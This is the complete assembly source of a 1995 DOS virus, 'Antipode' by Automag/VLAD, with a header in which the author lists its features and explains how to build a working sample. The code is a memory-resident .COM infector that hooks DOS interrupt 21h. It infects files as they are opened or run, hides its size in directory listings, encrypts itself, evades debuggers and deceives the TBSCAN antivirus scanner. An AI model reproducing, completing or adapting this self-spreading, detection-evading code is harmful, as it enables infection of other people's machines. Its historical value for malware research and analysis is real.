﻿


; Hi guys...
; Tonight it's Sun 1 Jan 1995     0:03:16 (4DOS Time)
; The Radio is playing U2's NEW YEARS DAY ;)
; So, I wish you a Happy NEW YEAR !!!!

; This virus is called Antipode, because of the position of France in
;       relation to Australia.
; It's my very first release:
;       - .COM/.com infection, not COMMAND.COM
;       - Find-first/next stealth     4e/4f + 11/12
;       - Time based marker: seconds field=2
;       - Infects read-only files
;       - Restores original Time/Date + second=2
;       - XOR encryption
;       - Memory resident, using MCB's
;       - Infection on Exec+Open+Extended Open
;               it's a pretty fast infector... try to scan your disk when
;               resident, it will use SCAN/TBSCAN and even F-PROT 
;               as a vector :)
;       - Write Protect Errors removed by int 24h handler
;       - I added a little trick to fool Veldman's TBSCAN, when in memory,
;               TBSCAN don't scan any infected file...

;       I'm sorry, but due to the encryption this virus is a bit tricky to 
;       create:         you must assemble as usual,
;                       link it to a bin file : IP must be 0
;                       append it to a .com that just jumps at the end
;                       now trace the resulting .com and skip the encryption
;                       but you MUST execute the push dx,
;                       without getting trapped by Qark :)

;       That's not too hard, but you must be worthy to use this virus :)



exec_adr        =       0000:0100h              ; Address of return

		jumps                           ; Allow Tasm to resolve too
						; long jumps
virusseg        segment byte public
		assume  cs:virusseg, ds:virusseg

		org     0000h                   ; Begin the virus at IP=0

start:
		push    ds:[101h]               ; 101=offset of the jump
		pop     dx
		add     dx,103h                 ; Dx=offset start
		push    dx                      ; put it on the stack

		mov     si,offset quit          ; adaptation of Qarks routine
						; to fool debuggers
		add     si,dx
		mov     word ptr ds:[si],20CDh
quit:           mov     word ptr ds:[si],04C7h
						; Heuristics and debuggers
						; won't find us now.
		call    cryptage                ; decrypt the virus
		jmp debut_cr                    ; jump to the virus

cryptage        proc near
		mov     si,offset debut_cr      ; start of the encrypted area
		add     si,dx                   ; fix it 
		mov     di,si                   ; use si as the xor value
cryptage_2      proc near                       ; this proc will be called to
						; encrypt the virus
		mov     cx,offset last-offset debut_cr
						; cx=length to encrypt
cr:             xor     word ptr ds:[si],di     ; enc/decrypt the virus
		inc     si                      ; move to next byte 
		loop    cr                      ; and enc/decrypt the virus
		ret
cryptage_2      endp
cryptage        endp

debut_cr:       
		mov     si,offset buffer        ; Buffer contains original
						; bytes of the virus
		add     si,dx                   ; fix it once again
		mov     di,100h                 ; destination is entrypoint
		push    cs
		pop     es
		movsw
		movsb                           ; Patch back to the original

		mov     ah,02ch                 ; Ask for the Time
		int     21h
		cmp     dl,242                  ; Are we in memory ? 
		jne     not_in_ram              ; if not, install
		push    cs
		mov     ax,100h
		push    ax
		retf                            ; go back to original entry

not_in_ram:
		push    cs
		pop     ax
		dec     ax
		mov     ds,ax                   ; DS -> MCB
		inc     ax
		mov     cx,word ptr ds:[0003]
		mov     dx,cx                   ; DX=number of parag. left
		add     dx,ax
		sub     cx,(((last2-start)/16)+1)*2
						; alloc 2*size of the virus 
		mov     word ptr ds:[0003],cx   ; fix the MCB
		mov     cx,dx
		sub     cx,(((last2-start)/16)+1)*2
		mov     es,cx                   ; es=future cs of the virus
		mov     cx,(last2-start)+1      ; size of the virus
		push    cs
		pop     ds
		pop     dx
		mov     si,dx                   ; si = entry of the virus

		push    si
		push    cx

		mov     di,0
		rep movsb                       ; copy the virus to es:0

		pop     cx
		pop     si

		rep movsb                       ; once again

		push    es
		mov     cx,offset nextstep
		push    cx
		retf                            ; Jump to ES:IP
		;install the virus in ram and hook vectors
nextstep:                                       ; We are at the top of mem

		push    cs
		pop     ds
		mov     word ptr ds:[farjmp+3],ax
						; Fix the return adress

		mov     ax,3521h                ; Save the int 21h vectors
		int     21h
		mov     ds:word ptr save_int21+2,es     
		mov     ds:word ptr save_int21,bx

		mov     dx,offset my_int21      ; Use our int instead
		mov     ax,2521h
		int     21h

farjmp:         jmp far ptr exec_adr            ;Return to the original


my_int21        proc    far
		cmp     ah,11h          ; Find first
		je      dir_stealth
		cmp     ah,12h          ; Find next
		je      dir_stealth
		cmp     ah,4Eh          ; Find first
		je      find_file
		cmp     ah,4Fh          ; Find next
		je      find_file
		cmp     ah,3dh          ; File open
		je      check_it
		cmp     ah,4bh          ; Exec
		je      check_it
		cmp     ah,6ch          ; Extended open
		je      check_it
		cmp     ah,4ch
		je      terminate
		cmp     ah,02ch         ; Time
		jne     to_vect

		call    int21

		mov     dl,242          ; seconds = 242
		push    cs
		pop     bx
		iret
check_it:
		jmp     check_it2

dir_stealth:
		call    int21
		test    al,al
		jnz     not_a_file

		pushf
		push    ax
		push    bx
		push    es

		mov     ah,51h
		int     21h

		mov     es,bx
		cmp     bx,es:[16h]
		jnz     not_infected
		mov     bx,dx
		mov     al,[bx]
		push    ax
		mov     ah,2fh
		int     21h
		pop     ax
		inc     al
		jnz     fcb_ok
		add     bx,7h
fcb_ok:         mov     ax,es:[bx+17h]
		add     bx,3
		jmp     patch_size
find_file:
		call    int21
		jc      not_a_file
		pushf
		push    ax
		push    bx
		push    es

		mov     ah,2Fh
		int     21h                     ; Ask for the DTA

		mov     ax,es:[bx+16h]          ; ax=time 
patch_size:
		and     al,1fh                  ; ax=seconds
		xor     al,1                    ; are seconds=2 ?
		jnz     not_infected
		mov     ax,offset last-offset start
						; ax = size of the virus
		cmp     byte ptr cs:[tbscan_active],1
						; is TBSCAN active ?
		jne     dont_fool
		mov     ax,word ptr es:[bx+1Ah] ; if active the file size = 0

dont_fool:      sub     word ptr es:[bx+1Ah],ax
						; sub virus size to file size

not_infected:
		pop      es
		pop      bx
		pop      ax
		popf

not_a_file:
		retf 2                          ; no iret to save the flags
						; thanks to Qark...

check_it2:      pushf
		push    ax
		push    bx
		push    cx
		push    di
		push    dx
		push    ds
		push    es
		push    si                      ; TOO MANY PUSHS !!!
						; OPTIMISE !!!
		mov     byte ptr cs:[function],ah
						; save ah for later
		cmp     ax,6c00h
		jne     not_extended
		cmp     dx,0001                 ; int 21h ax=6c00h/dx=0001h->
						; int 21 ah=3dh
		jne     no_good
		mov     dx,si                   ; the name -> DS:SI
not_extended:
		push    ds
		push    dx                      ; save filename seg/offs

		mov     ax,3524h
		int     21h
		mov     word ptr cs:[save_int24],bx
		mov     word ptr cs:[save_int24+2],es
						; save int 24h
		push    cs
		pop     ds
		mov     dx,offset my_int24
		mov     ax,2524h
		int     21h                     ; install our int

		pop     dx
		pop     ds                      ; restore the filename

		mov     al,00h
		push    ds
		push    ds
		pop     es
		mov     di,dx
		mov     cx,0ffh
		repne   scasb                   ; seek to the end of the name

		push    cs
		pop     ds
		cmp     byte ptr cs:[function],4bh
		jne     not_exec
		push    di
		sub     di,11
		mov     si,offset tbscan
		mov     cx,10
		rep     cmpsb
		jnz     not_tbscan
		mov     byte ptr cs:[tbscan_active],1
not_tbscan:
		pop     di
not_exec:
		sub     di,4
		push    di                      ; seek to the extension

		mov     si,offset comfile
		mov     cx,3

		rep     cmpsb                   ; check if the file is a COM
		pop     di
		jz      good


		push    di
		mov     si,offset comfile+3
		mov     cx,3

		rep     cmpsb                   ; or a com
		pop     di
		jnz     no_good

good:
		pop     ds
		cmp     byte ptr [di-2],'D'     ; COMMAND.COM ?
		jnz     not_command             
		cmp     byte ptr [di-8],'C'
		jz      push_no_good

not_command:    mov     ax,4300h
		int     21h                     ; get the attributes

		mov     word ptr cs:[save_attrib],cx
		jc      exit_2                  ; if no file exists...RUN !!!

		mov     ax,4301h
		xor     cx,cx
		int     21h                     ; set zero attributes

		push    ds
		push    dx

		mov     ax,3d02h                ;Open file Read/write

		call    int21

		mov     bx,ax                   ; bx = handle
		mov     ax,5700h                ; get file time/date
		int     21h
		mov     cs:[save_time],cx
		mov     cs:[save_date],dx       ; save them

		mov     ax,word ptr cs:[save_time]
						;Check for an infection
		and     al,1Fh
		xor     al,1    
		je      dirty_exit

		push    cs
		pop     ds
		mov     dx,offset buffer+(offset last2-offset start)+1
		mov     cx,end_patch-patch
		mov     ax,3F00h                ; Read xx first bytes
		int     21h                     ; to te buffer of the second
						; copy of the virus in memory

		xor     cx,cx
		xor     dx,dx
		mov     ax,4202h                ; Seek to EOF..
		int     21h

		mov     di,ax                   ; ax = end of file
		add     di,offset debut_cr-offset start+100h
						; di = value of the XOR
		sub     ax,3h                   ; ax = adress of the jump
		mov     word ptr cs:[return+1],ax
						; patch the future file
		mov     si,(offset last2-offset start)+offset debut_cr+1
						; si=offset of the 2nd virus
		push    si
		push    di

		call    cryptage_2              ; crypt the 2nd copy

		push    cs
		pop     ds
		mov     dx,offset last2+1       ; dx= offset of the 2nd copy
		mov     cx,last-start
		mov     ah,40h
		int     21h                     ; Write the virus to file...

		pop     di
		pop     si

		call    cryptage_2              ; decrypt the 2nd copy

		xor     cx,cx
		xor     dx,dx
		mov     ax,4200h                ; seek to start of file
		int     21h

		push    cs
		pop     ds
		mov     dx,offset patch
		mov     cx,end_patch-patch
		mov     ah,40h
		int     21h                     ; write the jump to the file

		mov     dx,cs:[save_date]
		mov     cx,cs:[save_time]
		or      cx,0001h
		and     cx,0FFE1h
		mov     ax,5701h
		int     21h                     ; restore file time/date

dirty_exit:
		pop     dx
		pop     ds

		mov     ah,3eh
		int     21h                     ; close the file


exit_2:         mov     ax,4301h
		mov     cx,word ptr cs:[save_attrib]
		int     21h                     ; restore the attributes
push_no_good:
		push    ds
no_good:
		pop     ds
		mov     ds,cs:[save_int24+2]
		mov     dx,cs:[save_int24]
		mov     ax,2524h
		int     21h                     ; restore the int 24h
		pop     si
		pop     es
		pop     ds
		pop     dx
		pop     di
		pop     cx
		pop     bx
		pop     ax
		popf
to_vect:        jmp     dword ptr cs:[save_int21]
						; and call the int 21h
terminate:
		mov     byte ptr cs:[tbscan_active],0
		jmp     to_vect

my_int21        endp

my_int24        proc    far                     ; int 24h
		mov     al,0                    ; no problem...
		iret                            ; and return
my_int24        endp

comfile         db 'COMcom'                     ; extensions to infect
tbscan          db 'TBSCAN.EXE'
		db '[Antipode 1.0]',0
		db 'by Automag/VLAD'
tbscan_active   db      0
buffer:         db      0CDh,20h,90h    
int21   proc    near
		pushf
		db 9Ah
save_int21      dw      2 dup (?)
		ret
int21   endp

patch:
return:         db      0e9h
last:           db      00,00
end_patch:


save_int24      dw      2 dup (?)
function        db      0
save_attrib     dw      0
save_date       dw      0
save_time       dw      0

last2:
virusseg        ends
		end     start



